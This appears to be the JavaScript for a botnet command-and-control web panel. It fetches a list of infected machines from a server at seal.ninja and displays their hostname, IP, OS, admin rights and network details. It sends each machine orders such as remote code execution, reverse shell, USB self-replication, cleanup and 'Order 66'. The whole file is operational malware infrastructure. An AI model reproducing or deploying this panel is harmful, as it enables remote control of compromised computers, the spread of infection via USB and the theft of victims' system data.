function get_clients(){

	document.getElementById("clients").innerHTML = '<img style="margin-left:auto; margin-right:auto; display:block" src="/static/img/spinner.gif">';

	var xhr = new XMLHttpRequest();
	xhr.onreadystatechange = function() {
		if (this.readyState == 4 && this.status == 200) {
			parse_clients(this.responseText);
		}
	};
	xhr.open("GET", "http://seal.ninja/api/get?clients", true);
	xhr.send();
}

function get_client(client_id){

	var collapse = document.getElementById("collapse_"+client_id);
	collapse.innerHTML = '<img style="margin-left:auto; margin-right:auto; display:block" src="/static/img/spinner.gif">';
	collapse.classList.add("show");
	collapse.classList.remove("hide");

	var xhr = new XMLHttpRequest();
	xhr.onreadystatechange = function() {
		if (this.readyState == 4 && this.status == 200) {
			parse_client(this.responseText);
		}
	};
	xhr.open("GET", "http://seal.ninja/api/get?client="+client_id, true);
	xhr.send();
}

function del_client(client_id){

	var xhr = new XMLHttpRequest();
	xhr.onreadystatechange = function() {
		if (this.readyState == 4 && this.status == 200) {
			client = document.getElementById(client_id);
			client.parentNode.removeChild(client);
		}
	};
	xhr.open("GET", "http://seal.ninja/api/del?client="+client_id, true);
	xhr.send();
}

function set_order(client_id){

	var select = document.getElementById("select_"+client_id);
	var order = select.options[select.selectedIndex].value;
	console.log(order);

	if(order != 0 && order != 1 && order != 4 && order != 6 && order != 7 && order != 8 && order != 66){
		document.getElementById("div_input_"+client_id).setAttribute("style","display:true");
	}else{
		document.getElementById("div_input_"+client_id).setAttribute("style","display:none");
	}

}

function send_order(client_id){

	var xhr = new XMLHttpRequest();

	var input = document.getElementById("input_"+client_id);
	var select = document.getElementById("select_"+client_id);
	var order = select.options[select.selectedIndex].value;

	if(order == 3 && input.value == ""){
		window.open('http://seal.ninja/shell?client='+client_id ,'_blank');
		return
	}
	
	xhr.open("GET", "http://seal.ninja/api/set?order="+order+";"+input.value+"&client="+client_id, true);
	xhr.send();

	select.selectedIndex = 0;
	input.value = "";
	document.getElementById("div_input_"+client_id).setAttribute("style","display:none");
}


function client_card(client){

	var card = 
		'<div id="'+client.id+'" class="card center">\
			<div class="card-header">\
				<div class="row">\
					<div class="col-2 left">\
						<a class="btn btn-dark bot-id" data-toggle="collapse" href="#collapse_'+client.id+'">\
							'+client.id+'\
						</a>\
					</div>\
					<div class="col">\
						<select class="form-control" id="select_'+client.id+'" onchange="set_order(\''+client.id+'\')">\
							<option value="0">-- Send an order --</option>\
							<option value="1">Get system info</option>\
							<option value="2">Remote Code Execution</option>\
							<option value="3">Reverse shell</option>\
							<option value="4">Replication USB</option>\
							<option value="5">Change frequency</option>\
							<option value="6">Get USB replication status</option>\
							<option value="7">Get admin status</option>\
							<option value="8">Cleanup</option>\
							<option value="66">Order 66</option>\
						</select>\
					</div>\
					<div class="col" id="div_input_'+client.id+'" style="display:none">\
						<input class="form-control" id="input_'+client.id+'" type="text">\
					</div>\
					<div class="col-1">\
						<button class="btn btn-success" onclick="send_order(\''+client.id+'\')"><i class="fas fa-play-circle"></i></button>\
					</div>\
					<div class="col-1">\
						<button class="btn btn-danger" onclick="del_client(\''+client.id+'\')"><i class="fas fa-trash-alt"></i></button>\
					</div>\
					<div class="col-1 right">\
						<button class="btn btn-dark" onclick="get_client(\''+client.id+'\')"><i class="fas fa-sync-alt"></i></button>\
					</div>\
				</div>\
			</div>\
			<div id="collapse_'+client.id+'" class="collapse">\
				<div class="card-body">\
					<div class="container left">\
  						<div class="row">\
  							<div class="col">Hostname :</div>\
  							<div id="hostname_'+client.id+'" class="col-8">'+client.hostname+'</div>\
  						</div>\
  						<div class="row">\
  							<div class="col">ID :</div>\
  							<div id="id_'+client.id+'" class="col-8">'+client.id+'</div>\
  						</div>\
  						<div class="row">\
  							<div class="col">IP :</div>\
  							<div id="ip_'+client.id+'" class="col-8">'+client.ip+'</div>\
  						</div>\
  						<div class="row">\
  							<div class="col">Last seen :</div>\
  							<div id="last_seen_'+client.id+'" class="col-8">'+client.last_seen+'</div>\
  						</div>\
  						<div class="row">\
  							<div class="col">OS version :</div>\
  							<div id="os_'+client.id+'" class="col-8">'+client.os+'</div>\
  						</div>\
  						<div class="row">\
  							<div class="col">Replication USB :</div>';
  						if(client.replication == 1){
  							card += '<div id="replication_'+client.id+'" class="col-8 green">On</div></div>';
  						}
  						else {
  							card += '<div id="replication_'+client.id+'" class="col-8 red">Off</div></div>';
  						}
  						card += '<div class="row">\
  							<div class="col">Request frequency :</div>\
  							<div id="frequency_'+client.id+'" class="col-8">'+client.frequency+' ms</div>\
  						</div>\
  						<div class="row">\
  							<div class="col">Admin :</div>';
  						if(client.is_admin == "1"){
  							card += '<div id="admin_'+client.id+'" class="col-8 green">True</div>';
  						}
  						else if (client.is_admin == "0"){
  							card += '<div id="admin_'+client.id+'" class="col-8 red">False</div>';
  						}
  						else {
  							card += '<div id="admin_'+client.id+'" class="col-8">N/A</div>';
  						}
  						card += '</div>\
  						<div class="row">\
  							<div class="col">RCE :</div>\
  							<div id="rce_'+client.id+'" class="col-8"><pre>'+client.rce+'</pre></div>\
  						</div>\
  						<div class="row">\
  							<div class="col">Networks :</div>\
  						</div>';
  	
  	if(client.networks.length != 0){
  		card += '<div class="row">';
  		card += 
  				'<div class="col center network bold">MAC</div>\
  				 <div class="col center network bold">IP</div>\
  				 <div class="col center network bold">Mask</div>\
  				 <div class="col center network bold">Gateway</div>';

  		card += '</div>';
  	}	

  	for (var i = 0; i<client.networks.length; i++) {

  		card += '<div class="row" id="network_'+i+'_'+client.id+'">';

  		card += 
  				'<div class="col center network">'+client.networks[i]["mac"]+'</div>\
  				 <div class="col center network">'+client.networks[i]["ip"]+'</div>\
  				 <div class="col center network">'+client.networks[i]["mask"]+'</div>\
  				 <div class="col center network">'+client.networks[i]["gtw"]+'</div>';

  		card += '</div>';
  	}


  	card += 
					'</div>\
				</div>\
			</div>\
		</div>';

	return card;
}

function parse_clients(json){

	clients = JSON.parse(json);

	var div = document.getElementById("clients");

	div.innerHTML = "";
	
	for (var i = 0; i < clients.length; i++) {
		div.innerHTML += client_card(clients[i]);
	}
}

function parse_client(json){
	client = JSON.parse(json);

	var div = document.getElementById("clients");
	var children = div.children;
	var old;
	
	for(var i = 0; i < children.length; i++){
		if(children[i].id == client["id"]){
			old = children[i];
			break;
		}
	}

	var card = client_card(client);
	var swap = new DOMParser().parseFromString(card, 'text/html').body.childNodes[0]
	old.replaceWith(swap);

	var collapse = document.getElementById("collapse_"+client["id"]);
	collapse.classList.add("show");
}

function check_pulse() {
	var timeout = document.getElementById("pulse").value;
	document.getElementById("pulse").value = "";
	if(timeout == "" || timeout == "0" || timeout == null){
		return;
	}
	var xhr = new XMLHttpRequest();
	xhr.open("GET", "http://seal.ninja/api/set?timeout="+timeout+"&check_pulse", true);
	xhr.send();
}

get_clients();